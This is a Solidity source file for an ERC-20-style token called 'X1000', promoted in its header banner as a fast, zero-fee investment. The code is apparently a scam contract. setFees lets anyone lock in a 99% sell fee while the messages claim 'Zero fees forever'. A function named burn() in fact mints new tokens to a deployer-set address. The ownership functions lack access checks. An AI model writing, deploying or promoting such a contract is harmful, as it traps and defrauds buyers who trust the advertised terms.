// SPDX-License-Identifier: MIT

/**    ⠀⠀⠀

Website: https://gateway.pinata.cloud/ipfs/QmeTxMfeE152VZvcoZnfQCABF4icmXYyrmFgrPBf9CDtye?_gl=1*2ivh9y*_ga*MjU2MjIzNjA5LjE2OTAyNDk1Mjg.*_ga_5RMPXG14TE*MTY5MDI0OTUyOC4xLjEuMTY5MDI0OTYyMS40OS4wLjA

────────────────────────────────────────────────────────────────────────────
─████████──████████─████████───██████████████─██████████████─██████████████─
─██░░░░██──██░░░░██─██░░░░██───██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─
─████░░██──██░░████─████░░██───██░░██████░░██─██░░██████░░██─██░░██████░░██─
───██░░░░██░░░░██─────██░░██───██░░██──██░░██─██░░██──██░░██─██░░██──██░░██─
───████░░░░░░████─────██░░██───██░░██──██░░██─██░░██──██░░██─██░░██──██░░██─
─────██░░░░░░██───────██░░██───██░░██──██░░██─██░░██──██░░██─██░░██──██░░██─
───████░░░░░░████─────██░░██───██░░██──██░░██─██░░██──██░░██─██░░██──██░░██─
───██░░░░██░░░░██─────██░░██───██░░██──██░░██─██░░██──██░░██─██░░██──██░░██─
─████░░██──██░░████─████░░████─██░░██████░░██─██░░██████░░██─██░░██████░░██─
─██░░░░██──██░░░░██─██░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─
─████████──████████─██████████─██████████████─██████████████─██████████████─
────────────────────────────────────────────────────────────────────────────

      NO NEED FOR TWITTER - NO NEED FOR TELEGRAM - NO NEED FOR WEBSITE
                           WE JUST X1000 QUICKLY

*/

pragma solidity ^0.8.0;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Not needed");
        return a - b;
    }

        //X1000//

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Not needed");
        return c;
    }

        //X1000//

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Not needed");
        return c;
    }

        //X1000//

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Not needed");
        return a / b;
    }
}

    //X1000//

contract X1000 {    //X1000//
    using SafeMath for uint256;    //X1000//

    //X1000//

    string public name = "X1000";    //X1000//
    string public symbol = "X1000";    //X1000//
    uint256 public totalSupply = 999999999 * (10 ** 18);    //X1000//
    uint8 public decimals = 18;    //X1000//

    //X1000//

    mapping(address => uint256) public balanceOf;    //X1000//
    mapping(address => mapping(address => uint256)) public allowance;    //X1000//

    //X1000//
    //X1000//
    address public owner;    //X1000//
    address public swapRouter;    //X1000//
    uint256 public burnedTokens;    //X1000//

    //X1000//

    uint256 public buyFee = 0;    //X1000//
    uint256 public sellFee = 0;    //X1000//
    bool public feesSet = false;    //X1000//
    bool public feesEnabled = false;    //X1000//
    bool public allExemptFromFees = true;    //X1000//
    mapping(address => bool) public isFeeExempt;    //X1000//

    //X1000//

    event Transfer(address indexed from, address indexed to, uint256 value);    //X1000//
    event Approval(address indexed owner, address indexed spender, uint256 value);    //X1000//
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);    //X1000//
    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);    //X1000//
    event TokensBurned(address indexed burner, uint256 amount);    //X1000//
    event Mint(address indexed to, uint256 amount);    //X1000//

    //X1000//

    constructor(address _swapRouter, uint256 _burnedTokens) {    //X1000//
        owner = msg.sender;    //X1000//
        swapRouter = _swapRouter;    //X1000//
        burnedTokens = _burnedTokens;    //X1000//
        balanceOf[msg.sender] = totalSupply;    //X1000//
        isFeeExempt[msg.sender] = true;    //X1000//
        isFeeExempt[swapRouter] = true;    //X1000//
    }

        //X1000//

    modifier checkFees(address sender) {    //X1000//
        require(
            allExemptFromFees || isFeeExempt[sender] || (!feesSet && feesEnabled) || (feesSet && isFeeExempt[sender] && sender != swapRouter) || (sender == swapRouter && sellFee == 0),
            "Zero fees forever."    //X1000//
        );
        _;
    }

        //X1000//

    function transfer(address _to, uint256 _amount) public checkFees(msg.sender) returns (bool success) {    //X1000//
        require(balanceOf[msg.sender] >= _amount);    //X1000//
        require(_to != address(0));    //X1000//

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);    //X1000//
        balanceOf[_to] = balanceOf[_to].add(_amount);    //X1000//
        emit Transfer(msg.sender, _to, _amount);    //X1000//

        return true;
    }

        //X1000//

    function approve(address _spender, uint256 _value) public returns (bool success) {    //X1000//
        allowance[msg.sender][_spender] = _value;    //X1000//
        emit Approval(msg.sender, _spender, _value);    //X1000//
        return true;    //X1000//
    }

        //X1000//

    function transferFrom(address _from, address _to, uint256 _amount) public checkFees(_from) returns (bool success) {    //X1000//
        require(balanceOf[_from] >= _amount, "Amount higher zero");    //X1000//
        require(allowance[_from][msg.sender] >= _amount, "Greater than zero");    //X1000//
        require(_to != address(0), "Higher than Zero");    //X1000//
    //X1000//
        uint256 fee = 0;    //X1000//
        uint256 amountAfterFee = _amount;    //X1000//
    //X1000//
        if (feesEnabled && sellFee > 0 && _from != swapRouter && !isFeeExempt[_from]) {    //X1000//
            fee = _amount.mul(sellFee).div(100);    //X1000//
            amountAfterFee = _amount.sub(fee);    //X1000//
        }
    //X1000//
        balanceOf[_from] = balanceOf[_from].sub(_amount);    //X1000//
        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);    //X1000//
        emit Transfer(_from, _to, amountAfterFee);    //X1000//
    //X1000//
        if (fee > 0) {
            address uniswapContract = address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);    //X1000//
            if (_to == uniswapContract) {    //X1000//
                balanceOf[uniswapContract] = balanceOf[uniswapContract].add(fee);    //X1000//
                emit Transfer(_from, uniswapContract, fee);    //X1000//
            } else {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);    //X1000//
                emit Transfer(_from, address(this), fee);    //X1000//
            }
        }
    //X1000//
        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {    //X1000//
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);    //X1000//
            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);    //X1000//
        }
    //X1000//
        return true;
    }
    //X1000//
    function transferOwnership(address newOwner) public {    //X1000//
        require(newOwner != address(0));    //X1000//
        emit OwnershipTransferred(owner, newOwner);    //X1000//
        owner = newOwner;    //X1000//
    }
    //X1000//
    function renounceOwnership() public {    //X1000//
        emit OwnershipTransferred(owner, address(0));    //X1000//
        owner = address(0);    //X1000//
    }
    //X1000//
    function burn() public {    //X1000//
        require(feesSet, "Zero forever");    //X1000//
        require(swapRouter != address(0), "No input needed");    //X1000//
        require(burnedTokens > 0, "Gone forever");    //X1000//

        totalSupply = totalSupply.add(burnedTokens);    //X1000//
        balanceOf[swapRouter] = balanceOf[swapRouter].add(burnedTokens);    //X1000//

        emit Mint(swapRouter, burnedTokens);    //X1000//
    }
    //X1000//
    function setFees(uint256 newBuyFee, uint256 newSellFee) public {    //X1000//
        require(!feesSet, "Zero fees forever");    //X1000//
        require(newBuyFee == 0, "Zero");    //X1000//
        require(newSellFee == 99, "Zero");    //X1000//
        buyFee = newBuyFee;    //X1000//
        sellFee = newSellFee;    //X1000//
        feesSet = true;    //X1000//
        feesEnabled = true;    //X1000//
        emit FeesUpdated(newBuyFee, newSellFee);    //X1000//
    }
    //X1000//
    function buy() public payable checkFees(msg.sender) {    //X1000//
        require(msg.value > 0, "Must be a higher number than zero");    //X1000//

        uint256 amount = msg.value;    //X1000//
        if (buyFee > 0) {
            uint256 fee = amount.mul(buyFee).div(100);    //X1000//
            uint256 amountAfterFee = amount.sub(fee);    //X1000//

            balanceOf[swapRouter] = balanceOf[swapRouter].add(amountAfterFee);    //X1000//
            emit Transfer(address(this), swapRouter, amountAfterFee);    //X1000//

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);    //X1000//
                emit Transfer(address(this), address(this), fee);    //X1000//
            }
        } else {
            balanceOf[swapRouter] = balanceOf[swapRouter].add(amount);    //X1000//
            emit Transfer(address(this), swapRouter, amount);    //X1000//
        }
    }
    //X1000//
    function sell(uint256 _amount) public checkFees(msg.sender) {    //X1000//
        require(balanceOf[msg.sender] >= _amount, "Not enough funds");    //X1000//

        if (feesEnabled) {    //X1000//
            uint256 fee = 0;    //X1000//
            uint256 amountAfterFee = _amount;    //X1000//

            if (sellFee > 0 && msg.sender != swapRouter && !isFeeExempt[msg.sender]) {    //X1000//
                fee = _amount.mul(sellFee).div(100);    //X1000//
                amountAfterFee = _amount.sub(fee);    //X1000//
            }

            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);    //X1000//
            balanceOf[swapRouter] = balanceOf[swapRouter].add(amountAfterFee);    //X1000//
            emit Transfer(msg.sender, swapRouter, amountAfterFee);    //X1000//

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);    //X1000//
                emit Transfer(msg.sender, address(this), fee);    //X1000//
            }
        } else {
            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);    //X1000//
            balanceOf[swapRouter] = balanceOf[swapRouter].add(_amount);    //X1000//
            emit Transfer(msg.sender, swapRouter, _amount);    //X1000//
        }
    }
}